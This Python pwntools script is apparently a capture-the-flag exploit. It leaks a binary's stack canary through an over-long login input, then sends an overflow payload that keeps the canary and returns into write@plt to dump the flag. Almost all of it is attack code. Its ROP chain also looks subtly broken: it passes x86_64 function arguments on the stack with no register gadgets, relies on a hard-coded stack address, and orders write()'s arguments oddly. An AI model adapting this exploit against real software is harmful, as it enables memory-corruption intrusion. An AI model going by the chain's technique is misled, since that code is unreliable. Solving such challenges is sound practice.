from pwn import *


# Allows easy swapping between local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
source ~/pwndbg/gdbinit.py
b *main
continue
'''

# Set up pwntools for the correct architecture
exe = './binary'
elf = context.binary = ELF(exe, checksec=False)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start the process
io = start()

# Trigger login to leak canary
io.sendlineafter(b">", b"2")
io.sendlineafter(b":", b"40")
io.sendlineafter(b":", b"A" * 16)

# Leak and extract the canary
leak = io.recvline()
data = leak.split(b"Sorry, we couldn't find the user: ")[1]
canary = u64(data[24:32].ljust(8, b"\x00"))
log.success(f'Canary: {hex(canary)}')

# Address and gadgets
write_plt = p64(elf.plt['write'])          # `write()` function
flag_fd = p64(3)                           # Flag file descriptor (FD = 3)
flag_addr = p64(0x7ffe6a83b570)            # Flag address from GDB
flag_len = p64(64)                         # Flag length

# ROP chain
payload = flat(
    b"A" * 24,                # Buffer padding
    p64(canary),              # Correct canary value
    b"B" * 8,                  # Fake saved RBP
    write_plt,                 # Call write@plt
    flag_addr,                 # Address of the flag
    flag_fd,                   # Flag file descriptor (FD = 3)
    flag_len                   # Length of the flag (64 bytes)
)

# Trigger the exploit
io.sendlineafter(b">", b"1")
io.sendlineafter(b":", payload)

# Print the flag
flag = io.recv()
print(f"[+] Flag: {flag.decode()}")

io.interactive()
